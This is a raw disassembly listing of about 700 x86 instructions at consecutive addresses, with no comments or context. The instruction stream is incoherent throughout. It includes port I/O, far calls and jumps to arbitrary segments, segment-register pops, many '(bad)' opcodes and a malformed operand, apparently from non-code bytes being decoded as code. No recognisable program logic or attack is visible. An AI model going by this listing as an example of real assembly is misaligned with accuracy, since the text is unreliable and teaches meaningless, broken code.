  41c17c:	outs   dx,DWORD PTR ds:[esi]
  41c17d:	adc    ah,bl
  41c17f:	adc    edx,DWORD PTR [eax]
  41c181:	nop
  41c182:	(bad)  
  41c183:	cmp    esp,DWORD PTR [eax-0x22]
  41c186:	cli    
  41c187:	rcl    bh,1
  41c189:	inc    esp
  41c18a:	pushf  
  41c18b:	inc    esi
  41c18c:	xchg   BYTE PTR ds:0x76438045,bl
  41c192:	js     0x41c18d
  41c194:	in     al,0xf6
  41c196:	jb     0x41c1f8
  41c198:	xchg   BYTE PTR [edi],ah
  41c19a:	xor    DWORD PTR [ebx],ecx
  41c19c:	pop    ecx
  41c19d:	xchg   edi,eax
  41c19e:	sbb    eax,0x7a873493
  41c1a3:	mov    bl,0xa5
  41c1a5:	call   FWORD PTR [esi+0x1931e125]
  41c1ab:	in     al,dx
  41c1ac:	mov    dl,0x46
  41c1ae:	push   0x81bcb725
  41c1b3:	lds    esp,FWORD PTR ds:0x830f4ef5
  41c1b9:	sub    eax,DWORD PTR [ecx+0x6b392e92]
  41c1bf:	stos   BYTE PTR es:[edi],al
  41c1c0:	xor    ah,0xdd
  41c1c3:	pop    ss
  41c1c4:	jno    0x41c15d
  41c1c6:	js     0x41c22e
  41c1c8:	js     0x41c1ff
  41c1ca:	pop    esi
  41c1cb:	sti    
  41c1cc:	sbb    eax,0xbf5be524
  41c1d1:	popa   
  41c1d2:	mov    bl,0xb3
  41c1d4:	sbb    BYTE PTR [esi],al
  41c1d6:	xchg   esi,eax
  41c1d7:	retf   
  41c1d8:	lds    ebx,FWORD PTR [ebp+0x3a]
  41c1db:	xchg   ecx,eax
  41c1dc:	pop    es
  41c1dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c1de:	call   0x1ed5:0x66e07632
  41c1e5:	mov    ds:0x1be64a49,eax
  41c1ea:	stos   DWORD PTR es:[edi],eax
  41c1eb:	dec    edi
  41c1ec:	mov    bh,0x44
  41c1ee:	mov    al,0xa3
  41c1f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c1f1:	test   BYTE PTR [edi+ecx*8-0x49291a17],0xe2
  41c1f9:	repz es dec ecx
  41c1fc:	push   ebx
  41c1fd:	jne    0x41c1fc
  41c1ff:	jle    0x41c24a
  41c201:	mov    ds:0xc2989ad4,al
  41c206:	add    DWORD PTR [ecx+eax*4-0x58],esi
  41c20a:	mov    ah,0xbb
  41c20c:	arpl   WORD PTR [ecx+0x79],si
  41c20f:	jno    0x41c25b
  41c211:	dec    edi
  41c212:	mov    dl,BYTE PTR [ebx+0x69]
  41c215:	leave  
  41c216:	out    dx,eax
  41c217:	mov    ebp,0x598cbc81
  41c21c:	loope  0x41c1a2
  41c21e:	pop    edx
  41c21f:	dec    esi
  41c220:	mov    al,BYTE PTR [ecx-0x567fe6d8]
  41c226:	aad    0x3e
  41c228:	int    0xe8
  41c22a:	enter  0xf96a,0xa
  41c22e:	push   ebx
  41c22f:	add    edx,DWORD PTR [edi+ecx*1+0x32]
  41c233:	or     al,BYTE PTR [ebp+edi*8+0x4e035553]
  41c23a:	outs   dx,BYTE PTR ds:[esi]
  41c23b:	jno    0x41c223
  41c23d:	aad    0x54
  41c23f:	in     al,0x8a
  41c241:	dec    edx
  41c242:	adc    eax,0xa40247fc
  41c247:	mov    fs,WORD PTR [esi+edi*1+0x60927538]
  41c24e:	mov    ecx,0xc52438d4
  41c253:	and    al,0x3a
  41c255:	sub    bh,BYTE PTR [ecx-0x12ab2188]
  41c25b:	add    BYTE PTR [eax+0x6f4bf69e],ah
  41c261:	ins    BYTE PTR es:[edi],dx
  41c262:	retf   0x97b6
  41c265:	outs   dx,BYTE PTR ds:[esi]
  41c266:	loop   0x41c24c
  41c268:	jmp    0xff1f:0xbacc946a
  41c26f:	adc    DWORD PTR fs:[esi*4+0xca01f46],edx
  41c277:	cmc    
  41c278:	push   esp
  41c279:	inc    ebp
  41c27a:	mov    bl,0xb0
  41c27c:	pop    ebp
  41c27d:	pop    ss
  41c27e:	aaa    
  41c27f:	retf   
  41c280:	daa    
  41c281:	and    eax,0xdbac6d8f
  41c286:	or     al,0x2e
  41c288:	mov    bl,0x5e
  41c28a:	push   ecx
  41c28b:	xor    edx,eax
  41c28d:	sti    
  41c28e:	out    dx,al
  41c28f:	inc    ebp
  41c290:	mov    al,ds:0x6a316171
  41c295:	in     eax,dx
  41c296:	cmp    dh,bl
  41c298:	jae    0x41c2a8
  41c29a:	out    0x3d,al
  41c29c:	sbb    esp,DWORD PTR [edx+eiz*4]
  41c29f:	mov    DWORD PTR [edi],edi
  41c2a1:	pop    ebp
  41c2a2:	mov    bh,0x99
  41c2a4:	or     eax,0xaf7239ae
  41c2a9:	les    edi,FWORD PTR [edi-0x54]
  41c2ac:	fwait
  41c2ad:	mov    bl,0x8e
  41c2af:	pop    ebx
  41c2b0:	sub    DWORD PTR [eax-0x6ab0e9be],esi
  41c2b6:	call   0xf3e5:0x49be7ff6
  41c2bd:	xchg   ebp,eax
  41c2be:	test   ebp,esp
  41c2c0:	adc    eax,0xb5382789
  41c2c5:	pop    ebp
  41c2c6:	test   dl,dh
  41c2c8:	pusha  
  41c2c9:	leave  
  41c2ca:	push   esi
  41c2cb:	jp     0x41c349
  41c2cd:	xchg   ecx,eax
  41c2ce:	xchg   BYTE PTR [ebx+0xe],al
  41c2d1:	outs   dx,BYTE PTR ds:[esi]
  41c2d2:	inc    eax
  41c2d3:	das    
  41c2d4:	lea    ebp,[edx-0x69]
  41c2d7:	es add al,0xb8
  41c2da:	jmp    0x41c2df
  41c2dc:	mov    eax,ds:0x8ce649dc
  41c2e1:	add    al,0x4a
  41c2e3:	popf   
  41c2e4:	fmul   QWORD PTR [ecx-0x56]
  41c2e7:	jp     0x41c2f3
  41c2e9:	pop    esp
  41c2ea:	pop    edi
  41c2eb:	sbb    dl,BYTE PTR [ebx+ebx*2-0x1]
  41c2ef:	dec    edi
  41c2f0:	out    dx,al
  41c2f1:	inc    edi
  41c2f2:	dec    ebp
  41c2f3:	popf   
  41c2f4:	in     al,dx
  41c2f5:	sbb    ah,BYTE PTR [edi-0x50]
  41c2f8:	xchg   ecx,eax
  41c2f9:	add    ch,BYTE PTR [edx+0x346c342e]
  41c2ff:	in     al,0x4f
  41c301:	pushf  
  41c302:	sbb    bl,BYTE PTR [esp+ebp*4+0x2bee71f5]
  41c309:	(bad)  
  41c30a:	pusha  
  41c30b:	dec    esp
  41c30c:	inc    ecx
  41c30d:	mov    edx,0xb2d2ae35
  41c312:	xchg   DWORD PTR [eax+0x20f1dfb9],esi
  41c318:	mov    bh,0x7
  41c31a:	and    BYTE PTR [edx-0x74d32015],dl
  41c320:	push   edi
  41c321:	cmp    BYTE PTR [ebx+0x25],dl
  41c324:	mov    al,ds:0x83c3e1e9
  41c329:	inc    edi
  41c32a:	mov    al,0x85
  41c32c:	add    al,0xf9
  41c32e:	leave  
  41c32f:	or     BYTE PTR [esi],dh
  41c331:	aad    0xf1
  41c333:	push   0x5a
  41c335:	nop
  41c336:	jg     0x41c3aa
  41c338:	add    eax,0xf2c29851
  41c33d:	mov    al,0x1e
  41c33f:	mov    bh,0x90
  41c341:	mov    dh,0x1a
  41c343:	cmp    al,0xc0
  41c345:	push   edi
  41c346:	dec    ebx
  41c347:	push   DWORD PTR [edi+0x509d4782]
  41c34d:	pop    ebp
  41c34e:	adc    DWORD PTR [eax+ebp*1],0xd3db0dae
  41c355:	dec    esp
  41c356:	cmp    esp,eax
  41c358:	push   cs
  41c359:	pop    ds
  41c35a:	mov    eax,DWORD PTR [edi+0x3d]
  41c35d:	fadd   st,st(3)
  41c35f:	cli    
  41c360:	jecxz  0x41c374
  41c362:	ds push ds
  41c364:	bound  eax,QWORD PTR [eax+0x56]
  41c367:	or     edx,ebx
  41c369:	mov    ss,WORD PTR [edx]
  41c36b:	xor    DWORD PTR [edi+ebx*1+0x48],eax
  41c36f:	shr    cl,1
  41c371:	sub    BYTE PTR [esi-0x4eb186fe],cl
  41c377:	xor    ebx,DWORD PTR [ecx-0x6f]
  41c37a:	dec    ebx
  41c37b:	mov    al,ds:0x5aea29af
  41c380:	jo     0x41c339
  41c382:	ins    DWORD PTR es:[edi],dx
  41c383:	scas   al,BYTE PTR es:[edi]
  41c384:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c385:	out    0xa9,al
  41c387:	test   al,0xbc
  41c389:	mov    eax,ds:0x32b33aad
  41c38e:	mov    ebp,0xc4138649
  41c393:	pop    edi
  41c394:	std    
  41c395:	out    0xf,eax
  41c397:	test   ecx,0xd950fd03
  41c39d:	or     bl,bl
  41c39f:	inc    edx
  41c3a0:	repnz inc esp
  41c3a2:	loop   0x41c3d2
  41c3a4:	jecxz  0x41c349
  41c3a6:	push   eax
  41c3a7:	out    0x84,al
  41c3a9:	add    ecx,DWORD PTR [ebp+0x7d]
  41c3ac:	sub    ah,BYTE PTR [edx+eax*2]
  41c3af:	test   eax,0x5ecc0c52
  41c3b4:	cmp    BYTE PTR [eax+0x56154550],bl
  41c3ba:	pop    eax
  41c3bb:	adc    al,0xeb
  41c3bd:	lock cmp DWORD PTR [ecx-0x14],esp
  41c3c1:	popf   
  41c3c2:	xchg   esi,eax
  41c3c3:	push   cs
  41c3c4:	dec    ebp
  41c3c5:	jae    0x41c3b7
  41c3c7:	out    dx,al
  41c3c8:	sub    edx,edi
  41c3ca:	pop    eax
  41c3cb:	out    dx,eax
  41c3cc:	jne    0x41c417
  41c3ce:	pop    ss
  41c3cf:	dec    BYTE PTR [ebx]
  41c3d1:	inc    edi
  41c3d2:	push   0x61
  41c3d4:	or     esi,esp
  41c3d6:	cs xor al,0xf5
  41c3d9:	rcl    DWORD PTR [edi+0x3e],cl
  41c3dc:	dec    edi
  41c3dd:	sahf   
  41c3de:	pop    esp
  41c3df:	fdivr  DWORD PTR [esi-0x36ce4749]
  41c3e5:	data16 jno 0x41c3d6
  41c3e8:	mov    WORD PTR [edx-0x122535b8],cs
  41c3ee:	pop    esi
  41c3ef:	into   
  41c3f0:	add    BYTE PTR [esi],dl
  41c3f2:	mov    esi,0x7dff2e98
  41c3f7:	shl    BYTE PTR [edi],cl
  41c3f9:	call   0xc57b:0x73d603dd
  41c400:	xor    DWORD PTR [edi],ebp
  41c402:	adc    al,0xfb
  41c404:	sbb    esp,ecx
  41c406:	js     0x41c3b9
  41c408:	inc    esp
  41c409:	ret    
  41c40a:	iret   
  41c40b:	sbb    BYTE PTR [eax+0x53],0x70
  41c40f:	inc    edi
  41c410:	pop    eax
  41c411:	mov    ch,0xb3
  41c413:	add    al,dl
  41c415:	push   eax
  41c416:	sub    al,cl
  41c418:	jecxz  0x41c47a
  41c41a:	stc    
  41c41b:	jbe    0x41c41a
  41c41d:	pop    edx
  41c41e:	add    dl,0x25
  41c421:	data16 cli 
  41c423:	enter  0x8a5b,0x54
  41c427:	xlat   BYTE PTR ds:[ebx]
  41c428:	mov    ds:0xc83c4e3,eax
  41c42d:	scas   eax,DWORD PTR es:[edi]
  41c42e:	mov    eax,0xe1be7397
  41c433:	lods   al,BYTE PTR ds:[esi]
  41c434:	mov    ah,al
  41c436:	lahf   
  41c437:	jmp    ecx
  41c439:	bound  edx,QWORD PTR [esi-0x695e08e]
  41c43f:	dec    ecx
  41c440:	jbe    0x41c494
  41c442:	std    
  41c443:	or     DWORD PTR [ebp+0x3d],esi
  41c446:	mov    eax,?
  41c448:	jb     0x41c498
  41c44a:	(bad)  
  41c44b:	cli    
  41c44c:	xor    BYTE PTR [eax],bh
  41c44e:	nop
  41c44f:	cli    
  41c450:	int    0xbe
  41c452:	fimul  DWORD PTR [edx+0x5a]
  41c455:	push   edx
  41c456:	ins    BYTE PTR es:[edi],dx
  41c457:	pop    ebx
  41c458:	xor    ecx,DWORD PTR [eax]
  41c45a:	pop    ecx
  41c45b:	mov    bl,BYTE PTR [esp+edx*2+0x3f61f75b]
  41c462:	test   BYTE PTR [ecx],al
  41c464:	lods   eax,DWORD PTR ds:[esi]
  41c465:	loop   0x41c4bf
  41c467:	mov    ds:0xb3144553,al
  41c46c:	gs (bad) 
  41c46f:	outs   dx,DWORD PTR ds:[esi]
  41c470:	inc    eax
  41c471:	and    esp,DWORD PTR [edx+0x4fe88750]
  41c477:	mov    ebx,0xbd9427e7
  41c47c:	or     al,0x64
  41c47e:	mov    dl,0x7
  41c480:	lahf   
  41c481:	int    0xf6
  41c483:	cdq    
  41c484:	in     eax,0xdb
  41c486:	dec    esp
  41c487:	adc    BYTE PTR ds:[ebp+0x6bdf39a0],bl
  41c48e:	or     eax,0x20048e22
  41c493:	sub    DWORD PTR [ecx-0x69],edx
  41c496:	push   ecx
  41c497:	xchg   edx,eax
  41c498:	fdivr  QWORD PTR [edi]
  41c49a:	fst    DWORD PTR [edi]
  41c49c:	ret    0xbd93
  41c49f:	push   ebp
  41c4a0:	and    ch,dl
  41c4a2:	mov    ds:0xe0a8ed18,al
  41c4a7:	ins    BYTE PTR es:[edi],dx
  41c4a8:	inc    edx
  41c4a9:	mov    cl,BYTE PTR [ebx-0x7b6250b0]
  41c4af:	enter  0x3988,0xd6
  41c4b3:	cs push 0x2f
  41c4b6:	push   0x25
  41c4b8:	sbb    al,0x5c
  41c4ba:	jg     0x41c50b
  41c4bc:	test   BYTE PTR [ecx+0x176b5c1b],dh
  41c4c2:	push   ecx
  41c4c3:	stos   BYTE PTR es:[edi],al
  41c4c4:	pushf  
  41c4c5:	jns    0x41c456
  41c4c7:	sub    al,al
  41c4c9:	inc    edx
  41c4cb:	or     eax,0xd259cd27
  41c4d0:	mov    cl,0x9
  41c4d2:	addr16 (bad) 
  41c4d4:	cmc    
  41c4d5:	and    dl,dl
  41c4d7:	cmc    
  41c4d8:	ss enter 0x59b4,0x7f
  41c4dd:	jne    0x41c4b2
  41c4df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c4e0:	mov    dh,0x6a
  41c4e2:	xchg   esi,eax
  41c4e3:	mov    ah,0x8b
  41c4e5:	inc    edi
  41c4e6:	ss adc edi,ecx
  41c4e9:	leave  
  41c4ea:	sbb    ebp,DWORD PTR [ebx+0x1e257325]
  41c4f0:	inc    DWORD PTR [edx+0x5330b144]
  41c4f6:	xchg   eax,ecx
  41c4f8:	xchg   ebp,eax
  41c4f9:	ins    BYTE PTR es:[edi],dx
  41c4fa:	fisub  WORD PTR [edx+esi*4]
  41c4fd:	push   DWORD PTR [ebx]
  41c4ff:	bound  ebp,QWORD PTR [ebx-0x7e]
  41c502:	data16 mul BYTE PTR [edi]
  41c505:	bound  ecx,QWORD PTR [ecx+0xe265097]
  41c50b:	xchg   ebp,eax
  41c50c:	inc    ebx
  41c50d:	push   ecx
  41c50e:	pop    ss
  41c50f:	hlt    
  41c510:	std    
  41c511:	xchg   esp,eax
  41c512:	ss mov edx,0xf449ff35
  41c518:	popf   
  41c519:	mov    dh,0x3c
  41c51b:	dec    edx
  41c51c:	inc    esi
  41c51d:	sbb    DWORD PTR [esi+ecx*4+0x6576cf15],edx
  41c524:	data16 jne 0x41c570
  41c527:	mov    edx,0x22215aaa
  41c52c:	in     eax,0xb2
  41c52e:	rcr    ch,0x69
  41c531:	jge    0x41c5a9
  41c533:	in     eax,dx
  41c534:	jo     0x41c4cc
  41c536:	push   ss
  41c537:	mov    eax,0x2fc0898
  41c53c:	jns    0x41c52b
  41c53e:	pop    edx
  41c53f:	(bad)  
  41c540:	push   eax
  41c541:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c542:	ins    BYTE PTR es:[edi],dx
  41c543:	test   eax,0x3cc8159
  41c548:	cmc    
  41c549:	inc    esp
  41c54a:	hlt    
  41c54b:	jp     0x41c4e4
  41c54d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c54e:	xor    bl,al
  41c550:	retf   0xe65e
  41c553:	pop    esp
  41c554:	cs xchg edi,eax
  41c556:	xchg   BYTE PTR [edx+0x4d7004c7],al
  41c55c:	stc    
  41c55d:	ds sbb al,0xbb
  41c560:	mov    bh,0xc
  41c562:	sub    cl,BYTE PTR [eax]
  41c564:	jae    0x41c505
  41c566:	retf   0x1ee8
  41c569:	scas   eax,DWORD PTR es:[edi]
  41c56a:	call   0xee11:0xb095993c
  41c571:	je     0x41c584
  41c573:	inc    esp
  41c574:	mov    edi,0xb603ff4d
  41c579:	leave  
  41c57a:	aaa    
  41c57b:	dec    eax
  41c57c:	add    DWORD PTR [eax-0x34],edx
  41c57f:	and    DWORD PTR [edi-0x7a2c410e],ebx
  41c585:	sti    
  41c586:	fs aad 0x43
  41c589:	(bad)  
  41c58a:	cmp    eax,0xbc744d13
  41c58f:	xor    eax,0xe7ea2538
  41c594:	cdq    
  41c595:	sub    BYTE PTR [ecx],ch
  41c597:	mov    ah,BYTE PTR [ebp+edx*4+0x6b]
  41c59b:	xor    BYTE PTR [edx+0x464192a8],ah
  41c5a1:	int    0x46
  41c5a3:	mov    dh,0x8c
  41c5a5:	xor    DWORD PTR [esi+0x20200ba6],ecx
  41c5ab:	cld    
  41c5ac:	js     0x41c566
  41c5ae:	out    0x2d,eax
  41c5b0:	test   eax,edx
  41c5b2:	ficom  WORD PTR [ebx-0x19]
  41c5b5:	in     eax,dx
  41c5b6:	lods   eax,DWORD PTR ds:[esi]
  41c5b7:	jo     0x41c623
  41c5b9:	frstor [ebp-0x5e3df600]
  41c5bf:	push   esp
  41c5c0:	aad    0x5a
  41c5c2:	jnp    0x41c574
  41c5c4:	sbb    ch,dh
  41c5c6:	mov    cl,0x87
  41c5c8:	sub    DWORD PTR [esi-0x6e],edx
  41c5cb:	mov    al,ds:0x719b8c8b
  41c5d0:	mov    ecx,0xce740ae4
  41c5d5:	les    esp,FWORD PTR [eax+eiz*8+0x1e]
  41c5d9:	add    DWORD PTR [edi+0x54],esp
  41c5dc:	pop    ss
  41c5dd:	ds leave 
  41c5df:	arpl   WORD PTR [ecx],di
  41c5e1:	mov    ds:0x9c51f10c,eax
  41c5e6:	mov    esi,0x5d541a5a
  41c5eb:	and    al,0xbc
  41c5ed:	mov    edi,0xf84c2f93
  41c5f2:	les    esi,FWORD PTR [ebx]
  41c5f4:	mov    esi,0xe2423cd4
  41c5f9:	and    bh,BYTE PTR [eax]
  41c5fb:	je     0x41c5bf
  41c5fd:	push   0x14bad428
  41c602:	xor    DWORD PTR [eax],edi
  41c604:	ins    DWORD PTR es:[edi],dx
  41c605:	leave  
  41c606:	inc    edi
  41c607:	data16 fcmovnbe st,st(3)
  41c60a:	add    BYTE PTR ds:0x5f5266b6,0x70
  41c611:	adc    BYTE PTR [edx+0x9],bh
  41c614:	mov    al,ds:0x2c6698d8
  41c619:	adc    ah,BYTE PTR [ebp+0x51]
  41c61c:	jae    0x41c5da
  41c61e:	cli    
  41c61f:	popf   
  41c620:	sbb    esp,ebp
  41c622:	inc    esp
  41c623:	loope  0x41c5e2
  41c625:	push   ebx
  41c626:	or     eax,0x6c4fd1
  41c62b:	dec    eax
  41c62c:	sub    eax,0x842237fb
  41c631:	fs es mov esi,ds
  41c635:	pop    edi
  41c636:	mov    ds:0x4f376609,eax
  41c63b:	in     al,dx
  41c63c:	(bad)  
  41c63d:	pop    ebx
  41c63e:	push   esp
  41c63f:	out    0x1d,eax
  41c641:	in     eax,dx
  41c642:	mul    BYTE PTR [esi]
  41c644:	mov    ecx,DWORD PTR [edx-0x333593f]
  41c64a:	sbb    eax,0xd1fb4eb3
  41c64f:	fwait
  41c650:	jp     0x41c678
  41c652:	or     DWORD PTR [eax],ebx
  41c654:	call   0x59e7:0x2db3c
  41c65b:	push   ebx
  41c65c:	stos   DWORD PTR es:[edi],eax
  41c65d:	mov    edx,0xc9740e84
  41c662:	sub    al,0x73
  41c664:	int3   
  41c665:	push   ecx
  41c666:	jg     0x41c6c3
  41c668:	jg     0x41c65c
  41c66a:	push   edx
  41c66b:	xchg   edx,eax
  41c66c:	shl    BYTE PTR [edi],0xb
  41c66f:	mov    ch,cl
  41c671:	test   BYTE PTR [ebx+0x43],ah
  41c674:	cdq    
  41c675:	push   ebp
  41c676:	dec    ebx
  41c677:	(bad)  
  41c678:	fmul   QWORD PTR [esp+edx*1-0x44]
  41c67c:	pop    ss
  41c67d:	jnp    0x41c6ca
  41c67f:	(bad)  
  41c680:	jmp    0x537e04d2
  41c685:	cmp    ebx,DWORD PTR [eax-0x69]
  41c688:	jle    0x41c704
  41c68a:	add    eax,0xf9d0afcc
  41c68f:	adc    DWORD PTR [ebx+0xe],esp
  41c692:	add    eax,0xeec548c8
  41c697:	xchg   esi,eax
  41c698:	test   BYTE PTR [eax],bl
  41c69a:	push   ds
  41c69b:	fist   WORD PTR [edi+edi*2]
  41c69e:	xor    al,0x88
  41c6a0:	mov    esp,0x57a09e54
  41c6a5:	mov    eax,ds:0x37c0c4d3
  41c6aa:	neg    DWORD PTR ds:0x2191c2e2
  41c6b0:	arpl   WORD PTR fs:[edi+ebp*1+0x55],si
  41c6b5:	rol    DWORD PTR [edx],cl
  41c6b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c6b8:	sbb    esi,eax
  41c6ba:	popf   
  41c6bb:	mov    esi,0x2d0a1be6
  41c6c0:	aas    
  41c6c1:	mov    bh,0x74
  41c6c3:	aad    0xf4
  41c6c5:	sub    edx,DWORD PTR [eax+0xa]
  41c6c8:	in     eax,0xb2
  41c6ca:	aas    
  41c6cb:	mov    BYTE PTR [ecx],cl
  41c6cd:	adc    esi,eax
  41c6cf:	in     al,0x7
  41c6d1:	jle    0x41c700
  41c6d3:	dec    ebx
  41c6d4:	cld    
  41c6d5:	lods   al,BYTE PTR ds:[esi]
  41c6d6:	retf   
  41c6d7:	in     al,0xab
  41c6d9:	shr    DWORD PTR [eax],cl
  41c6db:	inc    edi
  41c6dc:	inc    ebp
  41c6dd:	icebp  
  41c6de:	(bad)  
  41c6df:	jp     0x41c741
  41c6e1:	pop    ecx
  41c6e2:	mov    ebp,0xc252a14e
  41c6e7:	mov    al,ds:0xfcf97100
  41c6ec:	out    0x4d,eax
  41c6ee:	and    dh,BYTE PTR [eax+0x2936c36d]
  41c6f4:	nop
  41c6f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c6f6:	mul    DWORD PTR fs:[ecx+ebp*1+0x69]
  41c6fb:	or     ecx,DWORD PTR [ebx-0x55151ef6]
  41c701:	and    eax,0xf694b047
  41c706:	pop    esp
  41c707:	pop    ds
  41c708:	xchg   bx,ax
  41c70a:	stos   DWORD PTR es:[edi],eax
  41c70b:	inc    edx
  41c70c:	mov    dh,0xe6
  41c70e:	jmp    0x1e90:0x313a3e41
  41c715:	je     0x41c6cc
  41c717:	sub    eax,0x3d34479f
  41c71c:	jle    0x41c6e7
  41c71e:	adc    DWORD PTR [ecx+0x11],esp
  41c721:	mov    dh,0xea
  41c723:	mov    al,ds:0x8d55ed67
  41c728:	inc    esp
  41c729:	add    edx,DWORD PTR [edi]
  41c72b:	xchg   ecx,eax
  41c72c:	retf   0x12a0
  41c72f:	lds    ecx,FWORD PTR ds:0x510baa1b
  41c735:	jmp    0xc4c1:0x4a5338db
  41c73c:	fadd   DWORD PTR [ecx+0x7e]
  41c73f:	clc    
  41c740:	or     ecx,DWORD PTR [eax-0x134b384a]
  41c746:	bound  esi,QWORD PTR [eax]
  41c748:	jb     0x41c780
  41c74a:	pop    edi
  41c74b:	ja     0x41c70c
  41c74d:	add    DWORD PTR [ebp-0xd],esp
  41c750:	sub    al,0xf3
  41c752:	sar    ch,0xf9
  41c755:	mov    eax,0x36285be5
  41c75a:	mov    ebp,0xbb59d2c2
  41c75f:	xchg   esp,eax
  41c760:	in     eax,dx
  41c761:	sub    eax,0x1b3c5a76
  41c766:	xchg   ecx,eax
  41c767:	iret   
  41c768:	or     cl,ch
  41c76a:	dec    edi
  41c76b:	mov    ebp,0x9318b164
  41c770:	stos   DWORD PTR es:[edi],eax
  41c771:	fidiv  DWORD PTR [edx-0x452383e]
  41c777:	and    eax,edx
  41c779:	out    dx,al
  41c77a:	aaa    
  41c77b:	adc    BYTE PTR [edi-0x7a],bl
  41c77e:	pop    ebp
  41c77f:	popf   
  41c780:	std    
  41c781:	pop    ebx
  41c782:	lea    edi,[esi]
  41c784:	mov    dh,0x5
  41c786:	push   esi
  41c787:	mov    eax,0xe7e380d
  41c78c:	xor    edi,esp
  41c78e:	push   ss
  41c78f:	mov    eax,DWORD PTR [esi+0x77]
  41c792:	dec    esi
  41c793:	and    ebx,edx
  41c795:	inc    eax
  41c796:	int3   
  41c797:	test   DWORD PTR [ecx+ebx*1],ecx
  41c79a:	jl     0x41c7e0
  41c79c:	pop    ds
  41c79d:	arpl   sp,si
  41c79f:	pop    ecx
  41c7a0:	ins    BYTE PTR es:[edi],dx
  41c7a1:	popa   
  41c7a2:	in     al,0x55
  41c7a4:	jae    0x41c729
  41c7a6:	mov    cs,WORD PTR [eax+0x63]
  41c7a9:	aad    0x84
  41c7ab:	inc    edi
  41c7ac:	sbb    edi,0x1
  41c7af:	inc    esi
  41c7b0:	add    DWORD PTR [eax-0x1d884364],edx
  41c7b6:	jp     0x41c7de
  41c7b8:	(bad)  
  41c7b9:	addr16 pop esp
  41c7bb:	shl    BYTE PTR [ebx-0x335e56ba],cl
  41c7c1:	rcr    BYTE PTR [ecx],1
  41c7c3:	iret   
  41c7c4:	stos   DWORD PTR es:[edi],eax
  41c7c5:	rcr    esp,0xc3
  41c7c8:	sbb    dl,BYTE PTR ds:0x6aa7a9f8
  41c7ce:	sub    bh,BYTE PTR [edi-0x48]
  41c7d1:	dec    ebp
  41c7d2:	(bad)  
  41c7d3:	and    BYTE PTR [edi],ch
  41c7d5:	jg     0x41c82f
  41c7d7:	sbb    ecx,DWORD PTR [edi-0x2b0b162d]
  41c7dd:	mov    ebp,ebp
  41c7df:	ror    DWORD PTR [esi+0x5813a6fb],0xa8
  41c7e6:	pop    esp
  41c7e7:	mov    fs,WORD PTR ds:0x556b3c97
  41c7ed:	(bad)  
  41c7ee:	aas    
  41c7ef:	jmp    0x11da:0xe5f97a50
  41c7f6:	psrld  mm4,QWORD PTR [ebx+0x60]
  41c7fa:	dec    ebp
  41c7fb:	aam    0xed
  41c7fd:	xchg   edi,eax
  41c7fe:	dec    ecx
  41c7ff:	iret   
  41c800:	push   0xffffffcb
  41c802:	mov    esp,0xa98383a5
  41c807:	push   ebp
  41c808:	mov    bl,0x6b
  41c80a:	les    ebp,FWORD PTR [ebx-0x354ec66b]
  41c810:	or     dh,0xa1
  41c813:	inc    edi
  41c814:	jbe    0x41c7ce
  41c816:	push   edx
  41c818:	mov    edx,0x99432bef
  41c81d:	clc    
  41c81e:	lods   eax,DWORD PTR ds:[esi]
  41c81f:	sbb    edi,DWORD PTR [esp+ebp*8]
  41c822:	fcom   DWORD PTR [ecx-0x3d]
  41c825:	maskmovq mm4,(bad)
  41c826:	mul    DWORD PTR [eax]
  41c828:	and    esp,edi
  41c82a:	ins    DWORD PTR es:[edi],dx
  41c82b:	sti    
  41c82c:	(bad)  
  41c82d:	pop    ds
  41c82e:	push   ebx
  41c82f:	sbb    eax,0x4f5cdd05
  41c834:	hlt    
  41c835:	mov    ebp,0x87b8af5a
  41c83a:	push   ecx
  41c83b:	push   ds
  41c83c:	mov    dl,0x50
  41c83e:	ret    0x3e4a
  41c841:	xlat   BYTE PTR ds:[ebx]
  41c842:	push   es
  41c843:	and    edi,DWORD PTR [esi-0x573ea611]
  41c849:	push   ecx
  41c84a:	retf   
  41c84b:	xor    DWORD PTR [ecx-0x47],0x9935be07
  41c852:	pop    esp
  41c853:	(bad)  
  41c854:	jmp    0x7aa1:0xd6050a31
  41c85b:	push   eax
  41c85c:	add    BYTE PTR [esp+eiz*8+0x11],0x7d
  41c861:	push   ebp
  41c862:	imul   edi,DWORD PTR [ebp-0x6b],0x1e5bc4c2
  41c869:	or     esp,DWORD PTR [eiz*1+0x6f54072e]
  41c870:	fwait
  41c871:	inc    ebp
  41c872:	aad    0xe4
  41c874:	mov    esi,0xee89497
  41c879:	bswap  ebp
  41c87b:	jge    0x41c802
  41c87d:	or     DWORD PTR [ebx-0x4d],edx
  41c880:	call   esi
  41c882:	fild   DWORD PTR [edx+0x436c6df3]
  41c888:	and    eax,0xaa9b6812
  41c88d:	push   ecx
  41c88e:	and    eax,0x7d53e53f
  41c893:	cmp    ecx,esi
  41c895:	sbb    ebx,DWORD PTR [edx]
  41c897:	adc    al,0xca
  41c899:	test   al,0x58
  41c89b:	jl     0x41c877
  41c89d:	inc    esp
  41c89e:	jmp    DWORD PTR [edx+0x25]
  41c8a1:	(bad)  [ebp-0x7e0e9264]
  41c8a7:	pop    ebp
  41c8a8:	mov    ebx,0x5e3cdb4d
  41c8ad:	clc    
  41c8ae:	ror    BYTE PTR [esi-0x43],1
  41c8b1:	int    0xa9
  41c8b3:	neg    DWORD PTR [esi+0x1fd8a233]
  41c8b9:	nop
  41c8ba:	mov    WORD PTR ds:0xfa5ec784,cs
  41c8c0:	inc    ebx
  41c8c1:	jmp    0x55f2a330
  41c8c6:	mov    DWORD PTR [ebx+0x1f4b4b8f],esp
  41c8cc:	outs   dx,DWORD PTR ds:[esi]
  41c8cd:	mov    edi,0x4503be62
  41c8d2:	in     al,dx
  41c8d3:	add    BYTE PTR [ebx+0x57],cl
  41c8d6:	repz inc ecx
  41c8d8:	adc    eax,0xa4913d80
  41c8dd:	pusha  
  41c8de:	inc    ecx
  41c8df:	jno    0x41c94c
  41c8e1:	push   esi
  41c8e2:	mov    cl,0x6b
  41c8e4:	mov    ebx,0x37cabfa4
  41c8e9:	enter  0xf03,0x2e
  41c8ed:	jnp    0x41c880
  41c8ef:	pop    ss
